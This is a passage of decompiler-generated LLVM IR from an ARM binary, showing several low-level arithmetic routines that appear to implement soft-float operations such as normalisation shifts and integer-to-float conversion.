  store i32 %v5_15d80, i32* %r0.global-to-local, align 4
  %v1_15d84 = and i32 %v3_15d80, 1048576
  %v2_15d84 = icmp eq i32 %v1_15d84, 0
  %v0_15d88 = load i32, i32* @r4, align 4
  %v1_15d88 = add i32 %v0_15d88, -1
  store i32 %v1_15d88, i32* @r4, align 4
  br i1 %v2_15d84, label %bb7, label %dec_label_pc_15d60

bb7:                                              ; preds = %dec_label_pc_15d78
  ret i32 %v5_15d80

; uselistorder directives
  uselistorder i32 %v0_15d7c, { 1, 2, 0 }
  uselistorder i1 %v1_15d78, { 1, 0 }
  uselistorder i32 %v1_15d64, { 1, 0 }
  uselistorder i32 %v0_15d60, { 1, 0 }
  uselistorder i32 %v0_15d4c, { 1, 0, 2 }
  uselistorder i32 %v0_15d48, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_15d60._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15d60, { 0, 2, 1 }
}

define i32 @function_15d90(i32 %arg1) local_unnamed_addr {
dec_label_pc_15d90:
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %v2_15d90 = icmp eq i32 %arg1, 0
  br i1 %v2_15d90, label %bb35, label %bb

bb:                                               ; preds = %dec_label_pc_15d90
  br label %.thread

bb35:                                             ; preds = %dec_label_pc_15d90
  %v1_15d9c10 = load i32, i32* @r1, align 4
  store i32 0, i32* @r1, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb35
  %v0_15df8 = phi i32 [ %arg1, %bb ], [ %v1_15d9c10, %bb35 ]
  %v1_15db0 = phi i32 [ 20, %bb ], [ 52, %bb35 ]
  %v2_15da8 = icmp ugt i32 %v0_15df8, 65535
  br i1 %v2_15da8, label %bb36, label %.thread3

bb36:                                             ; preds = %.thread
  %v2_15dac = and i32 %v0_15df8, 32768
  %v3_15dac = icmp eq i32 %v2_15dac, 0
  %v4_15dac = udiv i32 %v0_15df8, 65536
  br i1 %v3_15dac, label %.thread3, label %bb37

bb37:                                             ; preds = %bb36
  %v2_15db0 = add nsw i32 %v1_15db0, -16
  br label %.thread3

.thread3:                                         ; preds = %bb36, %.thread, %bb37
  %v1_15dbc = phi i32 [ %v1_15db0, %.thread ], [ %v1_15db0, %bb36 ], [ %v2_15db0, %bb37 ]
  %v1_15db8 = phi i32 [ %v0_15df8, %.thread ], [ %v4_15dac, %bb36 ], [ %v4_15dac, %bb37 ]
  %v2_15db4 = icmp ugt i32 %v1_15db8, 255
  br i1 %v2_15db4, label %bb38, label %.thread4

bb38:                                             ; preds = %.thread3
  %v2_15db8 = and i32 %v1_15db8, 128
  %v3_15db8 = icmp eq i32 %v2_15db8, 0
  %v4_15db8 = udiv i32 %v1_15db8, 256
  br i1 %v3_15db8, label %.thread4, label %bb39

bb39:                                             ; preds = %bb38
  %v2_15dbc = add nsw i32 %v1_15dbc, -8
  br label %.thread4

.thread4:                                         ; preds = %bb38, %.thread3, %bb39
  %v1_15dc8 = phi i32 [ %v1_15dbc, %.thread3 ], [ %v1_15dbc, %bb38 ], [ %v2_15dbc, %bb39 ]
  %v1_15dc4 = phi i32 [ %v1_15db8, %.thread3 ], [ %v4_15db8, %bb38 ], [ %v4_15db8, %bb39 ]
  %v2_15dc0 = icmp ugt i32 %v1_15dc4, 15
  br i1 %v2_15dc0, label %bb40, label %.thread5

bb40:                                             ; preds = %.thread4
  %v2_15dc4 = and i32 %v1_15dc4, 8
  %v3_15dc4 = icmp eq i32 %v2_15dc4, 0
  %v4_15dc4 = udiv i32 %v1_15dc4, 16
  br i1 %v3_15dc4, label %.thread5, label %bb41

bb41:                                             ; preds = %bb40
  %v2_15dc8 = add nsw i32 %v1_15dc8, -4
  br label %.thread5

.thread5:                                         ; preds = %bb40, %.thread4, %bb41
  %v1_15dd0 = phi i32 [ %v1_15dc8, %.thread4 ], [ %v1_15dc8, %bb40 ], [ %v2_15dc8, %bb41 ]
  %v1_15dd8 = phi i32 [ %v1_15dc4, %.thread4 ], [ %v4_15dc4, %bb40 ], [ %v4_15dc4, %bb41 ]
  %v2_15dcc = icmp ugt i32 %v1_15dd8, 3
  br i1 %v2_15dcc, label %bb42, label %.thread6

bb42:                                             ; preds = %.thread5
  %v2_15dd0 = add i32 %v1_15dd0, -2
  br label %bb43

.thread6:                                         ; preds = %.thread5
  %v5_15dd4 = udiv i32 %v1_15dd8, 2
  %v6_15dd4 = sub i32 %v1_15dd0, %v5_15dd4
  br label %bb43

bb43:                                             ; preds = %bb42, %.thread6
  %v0_15dd8 = phi i32 [ %v6_15dd4, %.thread6 ], [ %v2_15dd0, %bb42 ]
  %v4_15dd8 = udiv i32 %v1_15dd8, 8
  %v5_15dd8 = sub i32 %v0_15dd8, %v4_15dd8
  %v2_15ddc = add i32 %v5_15dd8, -32
  %v4_15ddc = sub i32 31, %v5_15dd8
  %v5_15ddc = and i32 %v4_15ddc, %v5_15dd8
  %v8_15ddc = icmp eq i32 %v5_15dd8, 32
  %v6_15de0 = icmp slt i32 %v5_15dd8, 32
  br i1 %v6_15de0, label %dec_label_pc_15de4, label %dec_label_pc_15e04

dec_label_pc_15de4:                               ; preds = %bb43
  %v2_15de4 = add i32 %v5_15dd8, -20
  %v7_15de8 = icmp sgt i32 %v2_15ddc, -12
  br i1 %v7_15de8, label %dec_label_pc_15dec, label %dec_label_pc_15e00

dec_label_pc_15dec:                               ; preds = %dec_label_pc_15de4
  store i32 %v5_15dd8, i32* @ip, align 4
  %v1_15df0 = sub i32 32, %v5_15dd8
  %v6_15df4 = shl i32 %v0_15df8, %v5_15dd8
  store i32 %v6_15df4, i32* @r1, align 4
  %v6_15df8 = lshr i32 %v0_15df8, %v1_15df0
  br label %.thread31

dec_label_pc_15e00:                               ; preds = %dec_label_pc_15de4
  %v8_15de4 = icmp eq i32 %v2_15de4, 0
  %v4_15de4 = add i32 %v5_15dd8, 2147483616
  %v5_15de4 = and i32 %v2_15de4, %v4_15de4
  br label %dec_label_pc_15e04

dec_label_pc_15e04:                               ; preds = %bb43, %dec_label_pc_15e00
  %v1_15e10.in = phi i32 [ %v2_15ddc, %bb43 ], [ %v2_15de4, %dec_label_pc_15e00 ]
  %v6_15e10 = phi i32 [ %v2_15ddc, %bb43 ], [ %v5_15dd8, %dec_label_pc_15e00 ]
  %v2_15e10.in = phi i32 [ %v5_15ddc, %bb43 ], [ %v5_15de4, %dec_label_pc_15e00 ]
  %v0_15e10 = phi i1 [ %v8_15ddc, %bb43 ], [ %v8_15de4, %dec_label_pc_15e00 ]
  %v1_15e10 = icmp slt i32 %v1_15e10.in, 0
  %v2_15e10 = icmp slt i32 %v2_15e10.in, 0
  %v3_15e04 = xor i1 %v2_15e10, %v1_15e10
  %v4_15e04 = or i1 %v0_15e10, %v3_15e04
  br i1 %v4_15e04, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_15e04
  %v6_15e04 = sub i32 32, %v6_15e10
  store i32 %v6_15e04, i32* @ip, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_15e04, %bb44
  %v6_15e08 = shl i32 %v0_15df8, %v6_15e10
  br i1 %v4_15e04, label %bb46, label %.thread31

bb46:                                             ; preds = %bb45
  %v6_15e0c = load i32, i32* @r1, align 4
  %v7_15e0c = load i32, i32* @ip, align 4
  %v12_15e0c = lshr i32 %v6_15e0c, %v7_15e0c
  %v13_15e0c = or i32 %v12_15e0c, %v6_15e08
  %v11_15e10 = shl i32 %v6_15e0c, %v6_15e10
  store i32 %v11_15e10, i32* @r1, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb45, %dec_label_pc_15dec, %bb46
  %v1_15e5c = phi i32 [ %v6_15df8, %dec_label_pc_15dec ], [ %v13_15e0c, %bb46 ], [ %v6_15e08, %bb45 ]
  %v0_15e14 = load i32, i32* @r4, align 4
  %v2_15e14 = sub i32 %v0_15e14, %v5_15dd8
  %v5_15e18 = icmp slt i32 %v0_15e14, %v5_15dd8
  br i1 %v5_15e18, label %bb48, label %bb47

bb47:                                             ; preds = %.thread31
  %v10_15e18 = mul i32 %v2_15e14, 1048576
  %v11_15e18 = add i32 %v10_15e18, %v1_15e5c
  %v7_15e1c = load i32, i32* @r5, align 4
  %v8_15e1c = or i32 %v7_15e1c, %v11_15e18
  store i32 %tmp33, i32* @r4, align 4
  store i32 %tmp32, i32* @r5, align 4
  ret i32 %v8_15e1c

bb48:                                             ; preds = %.thread31
  %v2_15e28 = sub i32 -32, %v2_15e14
  %v6_15e2c = icmp sgt i32 %v2_15e14, -32
  br i1 %v6_15e2c, label %dec_label_pc_15e30, label %dec_label_pc_15e68

dec_label_pc_15e30:                               ; preds = %bb48
  %v1_15e30 = add i32 %v2_15e28, 12
  %v8_15e34 = icmp sgt i32 %v1_15e30, 0
  br i1 %v8_15e34, label %dec_label_pc_15e50, label %dec_label_pc_15e38

dec_label_pc_15e38:                               ; preds = %dec_label_pc_15e30
  %v1_15e38 = add i32 %v2_15e28, 32
  %v1_15e3c = sub i32 0, %v2_15e28
  %v0_15e40 = load i32, i32* @r1, align 4
  %v6_15e40 = lshr i32 %v0_15e40, %v1_15e38
  %v7_15e44 = shl i32 %v1_15e5c, %v1_15e3c
  %v8_15e44 = or i32 %v6_15e40, %v7_15e44
  store i32 %v8_15e44, i32* @r1, align 4
  %v0_15e48 = load i32, i32* @r5, align 4
  %v7_15e48 = lshr i32 %v1_15e5c, %v1_15e38
  %v8_15e48 = or i32 %v0_15e48, %v7_15e48
  store i32 %tmp33, i32* @r4, align 4
  store i32 %tmp32, i32* @r5, align 4
  ret i32 %v8_15e48

dec_label_pc_15e50:                               ; preds = %dec_label_pc_15e30
  %v1_15e50 = sub i32 0, %v2_15e28
  %v1_15e54 = add i32 %v2_15e28, 32
  %v0_15e58 = load i32, i32* @r1, align 4
  %v6_15e58 = lshr i32 %v0_15e58, %v1_15e54
  %v7_15e5c = shl i32 %v1_15e5c, %v1_15e50
  %v8_15e5c = or i32 %v6_15e58, %v7_15e5c
  store i32 %v8_15e5c, i32* @r1, align 4
  %v0_15e60 = load i32, i32* @r5, align 4
  store i32 %tmp33, i32* @r4, align 4
  store i32 %tmp32, i32* @r5, align 4
  ret i32 %v0_15e60

dec_label_pc_15e68:                               ; preds = %bb48
  %v6_15e68 = lshr i32 %v1_15e5c, %v2_15e28
  store i32 %v6_15e68, i32* @r1, align 4
  %v0_15e6c = load i32, i32* @r5, align 4
  store i32 %tmp33, i32* @r4, align 4
  store i32 %tmp32, i32* @r5, align 4
  ret i32 %v0_15e6c

; uselistorder directives
  uselistorder i32 %v2_15e28, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v2_15e14, { 1, 0, 2 }
  uselistorder i32 %v1_15e5c, { 4, 1, 2, 3, 0 }
  uselistorder i32 %v6_15e08, { 1, 0 }
  uselistorder i32 %v2_15ddc, { 1, 0, 2 }
  uselistorder i32 %v5_15dd8, { 5, 4, 6, 2, 8, 1, 7, 3, 9, 10, 0, 12, 11 }
  uselistorder i32 %v4_15dc4, { 1, 0 }
  uselistorder i32 %v1_15dc4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_15db8, { 1, 0 }
  uselistorder i32 %v1_15db8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_15dac, { 1, 0 }
  uselistorder i32 %v0_15df8, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 %tmp33, { 3, 2, 1, 0 }
  uselistorder i32 %tmp32, { 3, 2, 1, 0 }
  uselistorder i32 -12, { 1, 2, 14, 15, 3, 17, 18, 4, 19, 20, 16, 13, 12, 11, 10, 9, 21, 22, 23, 5, 6, 7, 24, 8, 25, 27, 28, 29, 26, 0 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 15, 3, 5, 6, 4, 16, 12, 7, 0, 14, 13, 17, 1, 8, 2, 9, 18, 10, 11 }
  uselistorder i32 15, { 2, 3, 1, 5, 0, 4, 6 }
  uselistorder i32 -8, { 14, 15, 16, 17, 18, 19, 20, 13, 12, 5, 11, 10, 9, 8, 21, 22, 23, 24, 6, 25, 26, 3, 0, 29, 7, 27, 28, 2, 30, 31, 4, 1 }
  uselistorder i32 128, { 10, 9, 18, 19, 0, 17, 4, 6, 12, 13, 14, 1, 2, 7, 15, 16, 3, 11, 5, 8 }
  uselistorder i32 255, { 7, 8, 0, 10, 11, 9, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 6, 5, 4, 1, 17, 18, 19, 20, 21, 22, 3, 2, 0, 23 }
  uselistorder i32 65535, { 2, 3, 1, 4, 0 }
  uselistorder i32 52, { 0, 2, 3, 1, 4 }
  uselistorder i32 20, { 5, 0, 18, 32, 8, 33, 1, 9, 19, 20, 16, 11, 29, 2, 12, 21, 22, 23, 24, 17, 25, 26, 27, 28, 30, 4, 3, 10, 7, 31, 6, 13, 14, 15 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_15e04, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_15e74(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_15e74:
  store i32 %arg4, i32* @r3, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_15e74 = load i32, i32* @r4, align 4
  %v2_15e74 = icmp eq i32 %v0_15e74, 0
  %v1_15e78 = xor i32 %arg3, 1048576
  store i32 %v1_15e78, i32* @r2, align 4
  br i1 %v2_15e74, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_15e74
  %v2_15e7c = xor i32 %arg1, 1048576
  store i32 %v2_15e7c, i32* @r0, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_15e74
  %v1_15e84 = load i32, i32* @r5, align 4
  %v2_15e84 = add i32 %v1_15e84, -1
  store i32 %v2_15e84, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_15e88 = call i32 @function_15ce0()
  %v0_15e8c = load i32, i32* @r4, align 4
  %v0_15e8c.off = add i32 %v0_15e8c, 4194303
  %tmp = icmp ult i32 %v0_15e8c.off, 2097152
  %v1_15f08 = load i32, i32* @r5, align 4
  %v1_15f08.off = add i32 %v1_15f08, 4194303
  %tmp45 = icmp ult i32 %v1_15f08.off, 2097152
  br i1 %tmp, label %.thread11, label %bb33

bb33:                                             ; preds = %bb
  br i1 %tmp45, label %bb40, label %dec_label_pc_15e98

dec_label_pc_15e98:                               ; preds = %bb33
  %v4_15e98 = icmp eq i32 %v1_15f08, %v0_15e8c
  %v1_15e9c = load i32, i32* @r1, align 4
  br i1 %v4_15e98, label %bb34, label %dec_label_pc_15ea4

bb34:                                             ; preds = %dec_label_pc_15e98
  %v2_15e9c = load i32, i32* @r3, align 4
  %v5_15e9c = icmp eq i32 %v2_15e9c, %v1_15e9c
  br i1 %v5_15e9c, label %dec_label_pc_15eb4, label %dec_label_pc_15ea4

dec_label_pc_15ea4:                               ; preds = %dec_label_pc_15e98, %bb34
  %v2_15ea4 = or i32 %v1_15e9c, %v0_15e8c
  %v4_15ea4 = icmp eq i32 %v2_15ea4, 0
  br i1 %v4_15ea4, label %bb35, label %.thread6

bb35:                                             ; preds = %dec_label_pc_15ea4
  %v1_15ea8 = load i32, i32* @r2, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_15ea4, %bb35
  %v11_15eb0 = phi i32 [ %v0_15e88, %dec_label_pc_15ea4 ], [ %v1_15ea8, %bb35 ]
  ret i32 %v11_15eb0

dec_label_pc_15eb4:                               ; preds = %bb34
  %v1_15eb4 = load i32, i32* @r2, align 4
  %v4_15eb4 = icmp eq i32 %v1_15eb4, %v0_15e88
  br i1 %v4_15eb4, label %.thread8, label %bb36

bb36:                                             ; preds = %dec_label_pc_15eb4
  ret i32 0

.thread8:                                         ; preds = %dec_label_pc_15eb4
  %tmp46 = icmp ult i32 %v0_15e8c, 2097152
  br i1 %tmp46, label %dec_label_pc_15ecc, label %dec_label_pc_15edc

dec_label_pc_15ecc:                               ; preds = %.thread8
  %v1_15ecc = icmp slt i32 %v1_15e9c, 0
  %v3_15ed0 = mul i32 %v0_15e88, 2
  %v4_15ed0 = zext i1 %v1_15ecc to i32
  %v5_15ed0 = or i32 %v4_15ed0, %v3_15ed0
  %v9_15ed0 = icmp ule i32 %v5_15ed0, %v0_15e88
  %v10_15ed0 = icmp ult i32 %v3_15ed0, %v0_15e88
  %v11_15ed0 = select i1 %v1_15ecc, i1 %v9_15ed0, i1 %v10_15ed0
  br i1 %v11_15ed0, label %bb37, label %bb38

bb37:                                             ; preds = %dec_label_pc_15ecc
  %v2_15ed4 = or i32 %v5_15ed0, -2147483648
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_15ecc, %bb37
  %v11_15ed8 = phi i32 [ %v5_15ed0, %dec_label_pc_15ecc ], [ %v2_15ed4, %bb37 ]
  ret i32 %v11_15ed8

dec_label_pc_15edc:                               ; preds = %.thread8
  %v2_15edc = icmp ugt i32 %v0_15e8c, -4194305
  br i1 %v2_15edc, label %.thread9, label %bb39

bb39:                                             ; preds = %dec_label_pc_15edc
  %v2_15ee0 = add i32 %v0_15e88, 1048576
  ret i32 %v2_15ee0

.thread9:                                         ; preds = %dec_label_pc_15edc
  %v1_15ee8 = and i32 %v0_15e88, -2147483648
  %v1_15ef0 = or i32 %v1_15ee8, 2146435072
  ret i32 %v1_15ef0

.thread11:                                        ; preds = %bb
  br i1 %tmp45, label %.thread11..thread13_crit_edge, label %.thread14

.thread11..thread13_crit_edge:                    ; preds = %.thread11
  %v0_15f14.pre = load i32, i32* @r1, align 4
  br label %.thread13

.thread14:                                        ; preds = %.thread11
  store i32 %v0_15e88, i32* @r2, align 4
  br label %bb41

bb40:                                             ; preds = %bb33
  %v1_15f00 = load i32, i32* @r2, align 4
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread14
  %v1_15f1427 = phi i32 [ %v0_15e88, %.thread14 ], [ %v1_15f00, %bb40 ]
  %v1_15f10.in = phi i32* [ @r1, %.thread14 ], [ @r3, %bb40 ]
  %v1_15f10 = load i32, i32* %v1_15f10.in, align 4
  store i32 %v1_15f10, i32* @r3, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11..thread13_crit_edge, %bb41
  %v1_15f20 = phi i32 [ %v0_15e88, %.thread11..thread13_crit_edge ], [ %v1_15f1427, %bb41 ]
  %v0_15f14 = phi i32 [ %v0_15f14.pre, %.thread11..thread13_crit_edge ], [ %v1_15f10, %bb41 ]
  %v4_15f14 = mul i32 %v1_15f20, 4096
  %v5_15f14 = or i32 %v4_15f14, %v0_15f14
  %v7_15f14 = icmp eq i32 %v5_15f14, 0
  br i1 %v7_15f14, label %bb42, label %.thread17

bb42:                                             ; preds = %.thread13
  %v1_15f18 = load i32, i32* @r3, align 4
  %v2_15f18 = load i32, i32* @r2, align 4
  %v5_15f18 = mul i32 %v2_15f18, 4096
  %v6_15f18 = or i32 %v5_15f18, %v1_15f18
  %v8_15f18 = icmp eq i32 %v6_15f18, 0
  br i1 %v8_15f18, label %bb43, label %.thread17

bb43:                                             ; preds = %bb42
  %v5_15f1c = icmp eq i32 %v2_15f18, %v1_15f20
  br i1 %v5_15f1c, label %bb44, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb42, %bb43
  %v2_15f20 = or i32 %v1_15f20, 524288
  br label %bb44

bb44:                                             ; preds = %bb43, %.thread17
  %v11_15f24 = phi i32 [ %v1_15f20, %bb43 ], [ %v2_15f20, %.thread17 ]
  ret i32 %v11_15f24

; uselistorder directives
  uselistorder i32 %v1_15f20, { 2, 3, 0, 1 }
  uselistorder i32 %v1_15f10, { 1, 0 }
  uselistorder i1 %v1_15ecc, { 1, 0 }
  uselistorder i32 %v1_15e9c, { 2, 1, 0 }
  uselistorder i32 %v0_15e8c, { 4, 1, 3, 0, 2 }
  uselistorder i32 %v0_15e88, { 3, 4, 2, 5, 6, 7, 8, 1, 0, 9 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_15ea4, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_15f28(i32 %arg1) local_unnamed_addr {
dec_label_pc_15f28:
  %v2_15f28 = icmp eq i32 %arg1, 0
  br i1 %v2_15f28, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15f28
  ret i32 0

.thread:                                          ; preds = %dec_label_pc_15f28
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r1, align 4
  %v1_15f4c = call i32 @function_15d90(i32 0)
  ret i32 %v1_15f4c
}

define i32 @function_15f50() local_unnamed_addr {
dec_label_pc_15f50:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v0_15f50 = load i32, i32* @r0, align 4
  %v2_15f50 = icmp eq i32 %v0_15f50, 0
  br i1 %v2_15f50, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15f50
  store i32 0, i32* @r1, align 4
  ret i32 0

.thread:                                          ; preds = %dec_label_pc_15f50
  store i32 1074, i32* @r4, align 4
  %v1_15f68 = and i32 %v0_15f50, -2147483648
  store i32 %v1_15f68, i32* @r5, align 4
  %v2_15f68 = icmp eq i32 %v1_15f68, 0
  br i1 %v2_15f68, label %bb20, label %bb19

bb19:                                             ; preds = %.thread
  %v2_15f6c = sub i32 0, %v0_15f50
  store i32 %v2_15f6c, i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %.thread, %bb19
  %v0_15f70 = phi i32 [ %v0_15f50, %.thread ], [ %v2_15f6c, %bb19 ]
  store i32 %v0_15f70, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_15f78 = call i32 @function_15d90(i32 0)
  %v2_15f7c = mul i32 %v1_15f78, 2
  %v4_15f7c = icmp eq i32 %v2_15f7c, 0
  %v1_15f80 = and i32 %v2_15f7c, 4
  %v2_15f80 = icmp ne i32 %v1_15f80, 0
  %v3_15f80 = sdiv i32 %v2_15f7c, 8
  %v3_15f84 = zext i1 %v2_15f80 to i32
  %v6_15f84 = zext i32 %v3_15f80 to i64
  %v7_15f84 = sub nsw i32 33, %v3_15f80
  %v8_15f84 = zext i32 %v7_15f84 to i64
  %v9_15f84 = shl i64 %v6_15f84, %v8_15f84
  %v10_15f84 = sub nsw i32 32, %v3_15f80
  %v11_15f84 = shl i32 %v3_15f84, %v10_15f84
  %v12_15f84 = zext i32 %v11_15f84 to i64
  %v14_15f84 = or i64 %v12_15f84, %v9_15f84
  %v15_15f84 = trunc i64 %v14_15f84 to i32
  store i32 %v15_15f84, i32* %r0.global-to-local, align 4
  %v3_15f88 = mul i32 %v1_15f78, 536870912
  store i32 %v3_15f88, i32* @r1, align 4
  br i1 %v4_15f7c, label %.thread3, label %bb21

bb21:                                             ; preds = %bb20
  %v4_15f8c = icmp ult i32 %v2_15f7c, 16777216
  br i1 %v4_15f8c, label %bb25, label %bb22

bb22:                                             ; preds = %bb21
  %v4_15fa035 = icmp ugt i32 %v2_15f7c, -16777217
  br i1 %v4_15fa035, label %bb24.thread, label %bb23

bb24.thread:                                      ; preds = %bb22
  br label %.thread4

bb23:                                             ; preds = %bb22
  %v2_15f947 = xor i32 %v15_15f84, 939524096
  store i32 %v2_15f947, i32* %r0.global-to-local, align 4
  ret i32 %v2_15f947

.thread3:                                         ; preds = %bb20
  br label %.thread4

.thread4:                                         ; preds = %bb24.thread, %bb25, %.thread3
  %merge = phi i32 [ %v15_15f84, %.thread3 ], [ %v1_15fb8, %bb25 ], [ %v15_15f84, %bb24.thread ]
  ret i32 %merge

bb25:                                             ; preds = %bb21
  store i32 896, i32* @r4, align 4
  %v1_15fb0 = and i32 %v15_15f84, -2147483648
  store i32 %v1_15fb0, i32* @r5, align 4
  %tmp = bitcast i32 %v15_15f84 to float
  %tmp36 = call float @fabsf(float %tmp)
  %v1_15fb4 = bitcast float %tmp36 to i32
  store i32 %v1_15fb4, i32* %r0.global-to-local, align 4
  %v1_15fb8 = call i32 @function_15d90(i32 %v1_15fb4)
  store i32 %v1_15fb8, i32* %r0.global-to-local, align 4
  %v1_15fbc = load i32, i32* @r1, align 4
  %v2_15fbc = or i32 %v1_15fbc, %v1_15fb8
  %v4_15fbc = icmp eq i32 %v2_15fbc, 0
  br i1 %v4_15fbc, label %.thread4, label %dec_label_pc_15fec

dec_label_pc_15fec:                               ; preds = %bb25
  store i32 0, i32* @r5, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  store i32 %v1_15fbc, i32* %r0.global-to-local, align 4
  store i32 %v1_15fb8, i32* %r1.global-to-local, align 4
  %tmp37 = icmp ult i32 %v1_15fbc, 4194304
  call void @__pseudo_cond_branch(i1 %tmp37, i32 ptrtoint (i32* @global_var_15d34.438 to i32))
  %tmp38 = icmp ult i32 %v1_15fbc, 33554432
  br i1 %tmp38, label %bb27, label %bb26

bb26:                                             ; preds = %dec_label_pc_15fec
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_15fec, %bb26
  %v1_16018 = phi i32 [ 3, %dec_label_pc_15fec ], [ 6, %bb26 ]
  %tmp39 = icmp ult i32 %v1_15fbc, 268435456
  br i1 %tmp39, label %bb29, label %bb28

bb28:                                             ; preds = %bb27
  %v2_16018 = add nuw nsw i32 %v1_16018, 3
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v0_1601c = phi i32 [ %v1_16018, %bb27 ], [ %v2_16018, %bb28 ]
  %not. = icmp slt i32 %v1_15fbc, 0
  %v4_1601c = zext i1 %not. to i32
  %v5_1601c = add nsw i32 %v0_1601c, %v4_1601c
  %v1_16020 = sub nsw i32 32, %v5_1601c
  %v0_16024 = load i32, i32* %r1.global-to-local, align 4
  %v6_16024 = shl i32 %v0_16024, %v1_16020
  store i32 %v6_16024, i32* @ip, align 4
  %v6_16028 = lshr i32 %v0_16024, %v5_1601c
  %v1_1602c = load i32, i32* %r0.global-to-local, align 4
  %v7_1602c = shl i32 %v1_1602c, %v1_16020
  %v8_1602c = or i32 %v7_1602c, %v6_16028
  store i32 %v8_1602c, i32* %r1.global-to-local, align 4
  %v6_16030 = lshr i32 %v1_1602c, %v5_1601c
  store i32 %v6_16030, i32* %r0.global-to-local, align 4
  %v0_16034 = load i32, i32* %r4.global-to-local, align 4
  %v2_16034 = add i32 %v0_16034, %v5_1601c
  store i32 %v2_16034, i32* @r4, align 4
  %v4_16038 = sext i32 %v8_1602c to i64
  %v5_16038 = call i32 @function_15d34(i32 %v6_16030, i64 %v4_16038, i32 %v5_1601c, i32 %v1_16020)
  store i32 %v5_16038, i32* %r0.global-to-local, align 4
  ret i32 %v5_16038

; uselistorder directives
  uselistorder i32 %v5_1601c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_15fbc, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v1_15fb8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_15fb4, { 1, 0 }
  uselistorder i32 %v15_15f84, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v3_15f80, { 1, 2, 0 }
  uselistorder i32 %v2_15f7c, { 1, 0, 4, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 7, 0, 1, 2, 8, 3, 9, 4, 5, 6 }
  uselistorder i32 6, { 1, 2, 13, 14, 3, 4, 20, 5, 6, 15, 0, 7, 8, 9, 10, 16, 11, 17, 18, 12, 19 }
  uselistorder i32 3, { 56, 15, 53, 67, 54, 10, 58, 0, 23, 1, 2, 11, 3, 4, 43, 44, 80, 45, 46, 47, 48, 49, 50, 59, 8, 24, 60, 9, 57, 81, 16, 77, 78, 20, 63, 12, 61, 13, 7, 14, 62, 5, 6, 51, 21, 52, 22, 79, 55, 25, 64, 26, 27, 65, 28, 18, 29, 66, 30, 68, 19, 69, 31, 70, 32, 71, 34, 72, 33, 73, 42, 74, 35, 36, 75, 76, 37, 38, 39, 40, 17, 41 }
  uselistorder i32 (i32)* @function_15d90, { 1, 0, 2 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %.thread4, { 1, 2, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @function_1603c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1603c:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1603c = load i32, i32* @r4, align 4
